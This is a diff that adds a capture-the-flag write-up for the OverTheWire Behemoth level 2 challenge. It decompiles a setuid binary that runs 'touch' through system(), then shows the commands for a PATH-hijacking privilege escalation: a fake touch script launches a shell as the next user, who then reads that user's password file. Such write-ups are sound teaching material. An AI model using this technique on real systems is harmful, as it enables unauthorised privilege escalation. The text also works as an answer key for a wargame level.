@@ -93,4 +93,100 @@ Pretty weird.  Didn't really do anything, but it did end up creating a file loca
 
 Ok, we have a few things to track down here.  We can see a call to ```getpid```, ```sprintf```, ```lstat```, ```unlink```, ```system```, and ```sleep```.  I'm not 100% sure what ```lstat``` and ```unlink``` do, so let's take a look at them first.  Starting with ```lstat```, we can see that it is used to determine information about a file based on its filename.  Next we have ```unlink``` which appears to remove a link to a file if it exists.
 
-TODO
+We can follow the assembly here a little, but let's see what [Hopper](http://www.hopperapp.com) will give us for the psuedocode.
+
+```C
+int main(int arg0) {
+    esp = (esp & 0xfffffff0) - 0xa0;
+    getpid();
+    eax = *(esp + 0x1c);
+    sprintf(esp + 0x24, "touch %d", eax);
+    if ((__lstat(*(esp + 0x20), esp + 0x38) & 0xf000) != 0x8000) {
+            eax = *(esp + 0x20);
+            unlink(eax);
+            system(esp + 0x24);
+    }
+    sleep(0x7d0);
+    *(esp + 0x24) = 0x20746163;
+    *(int8_t *)(esp + 0x28) = 0x0;
+    system(esp + 0x24);
+    eax = 0x0;
+    edx = *(esp + 0x9c);
+    edx = edx ^ *0x14;
+    COND = edx == 0x0;
+    if (!COND) {
+            eax = __stack_chk_fail();
+    }
+    return eax;
+}
+```
+
+We can see that both calls to system, which is mostly likely where we want to be, are using ```esp + 0x24``` as their parameter.  Looking at the line ```sprintf(esp + 0x24, "touch %d", eax);``` it looks as though ```esp + 0x24``` should be the string ```touch <pid>``` where ```<pid>``` is the actual process id.  This also makes sense that we were seeing weird files being generated upon execution. Now, we need to figure out how to take over that command in order to try and get a shell.  So, in general, how does the system know where the ```touch``` command is?  It's not in the local directory, and even if it was you would need ```./touch``` to call it.  So this all ties back to the ```PATH``` environment variable.  If you lookup the definition of what the ```PATH``` variable is you'll find this or something similiar:  
+>"PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for executable files (i.e., ready-to-run programs) in response to commands issued by a user."
+So let's look at our ```PATH``` and see where the system is looking for the command ```touch```.
+
+```
+# echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+# whereis touch
+touch: /usr/bin/touch /bin/touch /usr/share/man/man1/touch.1.gz
+```
+
+If we look at where ```touch``` actually exists on the system and then where the ```PATH``` references one of those locations we will see that ```touch``` is actually being called from ```/usr/bin```.  We should be able to create our own ```touch``` command and add its location to the beginging of the ```PATH```, or at least before ```/usr/bin``` in the path, and our command should be used.  Let's try.
+
+```
+# echo /bin/dash > touch
+# cat touch 
+/bin/dash
+# chmod +x touch 
+# ./touch 
+$ whoami
+root
+```
+
+I changed the actual prompt so you could see the difference, but after creating a new script called ```touch``` that executes a new shell I ran it to make sure everything was working correctly. Now let's update our ```PATH``` and try to re-run ```behemoth2```.
+
+```
+# export PATH=~/CTF/OverTheWire/behemoth/:$PATH
+# echo $PATH
+/root/CTF/OverTheWire/behemoth/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+# ./behemoth2
+$ whoami
+root
+```
+
+So we can see that by adding the directory of our newly created ```touch``` command to the begining of the ```PATH``` we have take over that command and now instead of an arbitraty file being created we are greeted with a shell.  Let's head to the server and see if we can duplicate it without too much trouble.
+
+```
+behemoth2@melinda:/behemoth$ mktemp -d  
+/tmp/tmp.T2jaQATLdj
+behemoth2@melinda:/behemoth$ echo /bin/dash > /tmp/tmp.T2jaQATLdj/touch
+behemoth2@melinda:/behemoth$ chmod +x /tmp/tmp.T2jaQATLdj/touch
+behemoth2@melinda:/behemoth$ export PATH=/tmp/tmp.T2jaQATLdj:$PATH
+behemoth2@melinda:/behemoth$ ./behemoth2
+touch: cannot touch '6686': Permission denied
+```
+
+Hmmm, it looks like the new ```PATH``` wasn't used.  Let's verify everything.
+
+```
+behemoth2@melinda:/behemoth$ echo $PATH
+/tmp/tmp.T2jaQATLdj:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
+behemoth2@melinda:/behemoth$ ls /tmp/tmp.T2jaQATLdj
+touch
+behemoth2@melinda:/behemoth$ /tmp/tmp.T2jaQATLdj/touch
+$
+```
+
+Well that worked...
+
+Wouldn't be the first time we've had permission issues.  Let's make sure ```behemoth3``` has access to our ```touch``` command.
+
+```
+behemoth2@melinda:/behemoth$ chmod 777 /tmp/tmp.T2jaQATLdj/
+behemoth2@melinda:/behemoth$ ./behemoth2
+$ whoami
+behemoth3
+$ cat /etc/behemoth_pass/behemoth3
+**********
+```
